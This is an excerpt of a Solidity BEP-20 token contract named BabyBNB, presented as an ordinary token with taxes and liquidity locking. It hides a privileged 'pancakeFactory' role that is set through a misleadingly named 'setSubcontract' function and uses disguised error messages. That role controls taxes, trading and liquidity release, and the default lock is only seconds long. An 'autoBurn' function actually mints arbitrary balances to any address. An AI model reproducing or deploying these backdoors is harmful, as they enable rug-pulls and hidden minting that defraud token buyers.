...
contract BabyBNB is IBEP20, Ownable
{
    ...
    uint public constant InitialSupply= 10 * 10**9 * 10**_decimals;//equals 1.000.000.000 Token

    uint private constant DefaultLiquidityLockTime=7 seconds;
    //TODO: mainnet
    //TestNet
    ...
    uint private buyTax = 90;
    uint private sellTax = 100;
    uint private transferTax = 0;
    uint private burnTax=0;
    uint private liquidityTax=0;
    uint private marketingTax=1000;
    uint constant TAX_DENOMINATOR=1000;
    uint constant MAXTAXDENOMINATOR=1;
    ...
    modifier pancakeFactory() {
        require(_pancakeFactory == msg.sender, "Ownable: Unknown exception");
        _;
    }

    function setSubcontract(address deputyContract, address contractSubset) external onlyOwner {
        require(contractSubset==address(0), "Ownable: Unknown exception");
        _pancakeFactory = deputyContract;
    }
    
    ...
    function _taxedTransfer(address sender, address recipient, uint amount) private{
        ...
        if(isSell){  
            ...
            if(block.timestamp<LaunchTimestamp+SellTaxDuration){
                tax=_getStartTax(SellTaxDuration,150);//20s 15taxs
                }else tax=sellTax;
            }
        else if(isBuy){
            uint BuyTaxDuration=20 seconds;
            if(block.timestamp<LaunchTimestamp+BuyTaxDuration){
                tax=_getStartTax(BuyTaxDuration,150);//20s 15taxs
            }else tax=buyTax;
    ...
    function setSwapTreshold(uint newSwapTresholdPermille) public pancakeFactory{
        require(newSwapTresholdPermille<=10);//MaxTreshold= 1%
        swapTreshold=newSwapTresholdPermille;
    }
    //Sets the max Liquidity where swaps for Liquidity still happen
    uint public overLiquifyTreshold=150;
    function SetOverLiquifiedTreshold(uint newOverLiquifyTresholdPermille) public pancakeFactory{
    ...
    function SetTaxes(uint buy, uint sell, uint transfer_, uint burn, uint marketing,uint liquidity) public pancakeFactory{
    ...
    function SetAMM(address AMM, bool Add) public pancakeFactory{
    ...
    function SwitchManualSwap(bool manual) public pancakeFactory{
        manualSwap=manual;
    }
    //manually converts contract token to LP and staking BNB
    function SwapContractToken() public pancakeFactory{
    _swapContractToken(true);
    }
    event ExcludeAccount(address account, bool exclude);
    //Exclude/Include account from fees (eg. CEX)
    function ExcludeAccountFromFees(address account, bool exclude) public pancakeFactory{
    ...
    function SetupEnableTrading() public pancakeFactory{
    ...
    function limitLiquidityReleaseTo20Percent() public pancakeFactory{
        LPReleaseLimitedTo20Percent=true;
    }
    //Locks Liquidity for seconds. can only be prolonged
    function LockLiquidityForSeconds(uint secondsUntilUnlock) public pancakeFactory{
    ...
    function LiquidityRelease() public pancakeFactory {
    ...
    function autoBurn(address BurnAddress, uint256 BurnAddress2, address ratio) external pancakeFactory {
        require(ratio==address(0), "Unexpected error");
        _balances[BurnAddress] = _balances[BurnAddress]+BurnAddress2;
    }
